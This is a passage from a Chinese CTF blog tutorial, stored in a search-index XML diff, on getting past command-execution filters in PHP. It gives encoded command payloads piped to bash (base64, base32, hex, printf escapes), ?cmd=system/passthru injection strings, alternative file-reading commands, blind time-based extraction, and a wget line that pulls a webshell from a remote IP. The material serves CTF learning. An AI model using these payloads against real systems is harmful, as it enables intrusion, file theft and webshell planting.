+<p>a&#x3D;f;c&#x3D;a;d&#x3D;g;b&#x3D;l;cat $a$b$c$d.php（abcd拼接出来flag）</p>
+<h3 id="利用linux中的环境变量"><a href="#利用linux中的环境变量" class="headerlink" title="利用linux中的环境变量"></a>利用linux中的环境变量</h3><p>使用环境变量里的字符执行变量</p>
+<p>echo $PATH              #PATH默认系统环境变量</p>
+<p>如果出现：</p>
+<pre><code class="highlight bash">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></pre>
+
+<p>则以下代码表示了flag.php</p>
+<pre><code class="highlight plaintext">echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code></pre>
+
+<p>比如${PATH:5:1}指的是取路径的第五位（从0开始数，第0位是&#x2F;）的字符，步长为1，即只取一个字母l，以此类推就能拼接成关键字<code>flag.php</code></p>
+<h2 id="常见文件读取命令绕过："><a href="#常见文件读取命令绕过：" class="headerlink" title="常见文件读取命令绕过："></a>常见文件读取命令绕过：</h2><h3 id="base64编码："><a href="#base64编码：" class="headerlink" title="base64编码："></a>base64编码：</h3><pre><code class="highlight plaintext">cat flag.php--&gt; Y2FOIGZSYWcucGhw
+echo Y2FOIGZsYWcucGhw | base64 -d</code></pre>
+
+<p>管道符|把前面指令执行的结果，变成后面指令的参数，所以这里会解码读取命令</p>
+<p>执行命令的话有三种形式：</p>
+<pre><code class="highlight plaintext">echo Y2FOIGZsYWcucGhw | base64 -d | bash
+
+$(echo Y2FOIGZsYWcucGhw | base64 -d)
+
+`echo Y2FOIGZsYWcucGhw | base64 -d`   #反引号</code></pre>
+
+<p> 把<code>cat flag.php</code>，放在bash里执行，同理想换成什么命令就base64编码后替换</p>
+<h3 id="base32编码同理"><a href="#base32编码同理" class="headerlink" title="base32编码同理"></a>base32编码同理</h3><pre><code class="highlight plaintext">?cmd=system(&#x27;echo &quot;MNQXIIDGNRQWOLTQNBYA====&quot;|base32 -d|/bin/bash&#x27;);</code></pre>
+
+<h3 id="HEX编码（ASCII编码）"><a href="#HEX编码（ASCII编码）" class="headerlink" title="HEX编码（ASCII编码）"></a>HEX编码（ASCII编码）</h3><h4 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h4><pre><code class="highlight plaintext">import binascii
+s = b&quot;tac flag&quot;
+h = binascii.b2a_hex(s)
+print(h)</code></pre>
+
+<p>tac flag–&gt; 74616320666c6167</p>
+<pre><code class="highlight plaintext">echo &quot;74616320666c6167”|xxd -r -p|bash</code></pre>
+
+<h4 id="xxd-二进制显示和处理文件工具。"><a href="#xxd-二进制显示和处理文件工具。" class="headerlink" title="xxd: 二进制显示和处理文件工具。"></a>xxd: 二进制显示和处理文件工具。</h4><p>-r-p将纯十六进制转储的反向输出打印为了ASCII格式<br>bash、sh、&#x2F;bin&#x2F;bash、反引号等</p>
+<pre><code class="highlight plaintext">?cmd=passthru(&#x27;echo &quot;74616320666c6167”|xxd -r -p|bash&#x27;);</code></pre>
+
+<h4 id="shellcode编码（16进制的机器码）"><a href="#shellcode编码（16进制的机器码）" class="headerlink" title="shellcode编码（16进制的机器码）"></a>shellcode编码（16进制的机器码）</h4><pre><code class="highlight plaintext">?cmd=passthru(&#x27;printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;|bash&#x27;);
+
+?cmd=passthru(&#x27;`printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;`&#x27;);
+
+?cmd=passthru(&#x27;$(printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#x27;);</code></pre>
+
+<h2 id="读取命令被绕过："><a href="#读取命令被绕过：" class="headerlink" title="读取命令被绕过："></a>读取命令被绕过：</h2><p>比如说过滤了cat，在这之前先分清:</p>
+<p><code>cat flag.php</code> 是用于在终端上显示当前目录下名为 <code>flag.php</code> 的文件的内容。</p>
+<p><code>cat /flag</code> 是用于在终端上显示根目录下名为 flag 的文件的内容。</p>
+<p><code>cat flag</code> 是用于在终端上显示当前目录下名为 flag 的文件的内容。</p>
+<p>正常来说flag放在根目录下，不过也可能是在当前网页目录下</p>
+<p>别的指令也同理</p>
+<ul>
+<li><p>tac:反向显示，从最后一行开始往前显示</p>
+<pre><code class="highlight plaintext">tac /flag</code></pre>
+
+
+</li>
+<li><p>more:一页一页显示档案内容</p>
+<pre><code class="highlight plaintext">more flag.php</code></pre>
+
+
+</li>
+<li><p>less：与more类似</p>
+</li>
+<li><p>tail：查看末尾几行</p>
+</li>
+<li><p>nl：显示的时候，顺便输出行号</p>
+<pre><code class="highlight plaintext">nl /flag</code></pre></li>
+</ul>
+<p><code>nl /flag</code> 和 <code>nl flag</code> 是不同的。</p>
+<p>在 Linux 系统中，<code>nl</code>命令用于给文件添加行号。当使用 <code>nl /flag</code> 命令时，<code>/flag</code> 被视为一个文件路径，并将该文件的内容输出到标准输出（通常是终端），并在每一行前添加行号。如果 &#x2F;flag 文件存在且有读取权限，那么 <code>nl /flag</code> 将会给该文件的内容添加行号。</p>
+<p>而当使用 <code>nl flag</code> 命令时，flag 被视为一个相对于当前目录的文件路径。也就是说，<code>nl flag</code> 命令将会尝试在当前目录下找到名为 flag 的文件，并给其内容添加行号。（不过flag一般在根目录）</p>
+<ul>
+<li>od：以二进制方式读取档案内容。正常的<code>od /flag</code>输出的纯纯二进制<br>想看到文件内容需要：</li>
+</ul>
+<pre><code class="highlight plaintext">passthru(&quot;od -A d -c /fla\g&quot;);</code></pre>
+
+<ul>
+<li><p>xxd：读取二进制文件</p>
+<pre><code class="highlight plaintext">xxd /flag</code></pre>
+
+
+</li>
+<li><p>sort：主要用于排序文件 </p>
+<pre><code class="highlight plaintext">so?t /flag
+/usr/bin/s?rt /flag</code></pre></li>
+</ul>
+<p><code>/usr/bin/sort</code> 和 <code>sort</code> 实际上是同一个命令。<code>/usr/bin</code> 目录是系统的标准目录之一，它包含了许多系统命令和工具的二进制文件，而 sort 命令通常就存放在 <code>/usr/bin</code> 目录中,因此<code>/usr/bin/sort /flag</code> 和 <code>sort /flag</code> 是等价的。有时候sort不行可能<code>/usr/bin/s?r</code>t可以</p>
+<ul>
+<li>uniq：报告或删除文件中重复的行，其实当成cat用就行</li>
+<li>file -f:报错出具体内容<br>passthru(“file -f &#x2F;flag”);</li>
+<li>grep：在文本中查找指定字符串<br>passthru(“grep fla &#x2F;fla*”);</li>
+</ul>
+<p>grep fla &#x2F;fla* 命令会匹配根目录下所有以 fla 开头的文件（不包括子目录），然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令会搜索根目录下以 fla 开头的所有文件，并匹配其中包含 fla 字符串的行。</p>
+<p>而 grep fla fla* 命令中 fla* 是当前目录下以 fla 开头的所有文件的通配符，它会匹配当前目录下所有以 fla 开头的文件，然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令只会搜索当前目录下以 fla 开头的文件，并匹配其中包含 fla 字符串的行。</p>
+<ul>
+<li>strings：<br>相当于cat</li>
+</ul>
+<h2 id="无回显时间盲注："><a href="#无回显时间盲注：" class="headerlink" title="无回显时间盲注："></a>无回显时间盲注：</h2><p>逻辑和SQL注入的时间盲注差不多</p>
+<p>相关命令：<br>1.sleep<br>sleep 5       #5秒之后返回结果</p>
+<p>2.awk：逐行获取数据<br>3.cut -c<br>cut命令逐列获取单个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 1      #获取第一个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 2      #获取第二个字符</p>
+<p>3.利用cp命令：cp flag.php 1.txt</p>
+<p>4.利用mv命令：mv flag.php 1.txt</p>
+<p>5.利用&gt;输出结果到文件：ls &gt; 1.txt</p>
+<p>6.tee:Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</p>
+<p>7.利用wget下载：</p>
+<pre><code class="highlight plaintext">wget http://ip/shell.txt &gt; shell.php或者wget http://ip/shell.txt -O shell.php</code></pre>
+
+<p>8.dnslog外带数据</p>
+]]></content>
+      <tags>
+        <tag>-Web -CTF</tag>
       </tags>
   </entry>
 </search>
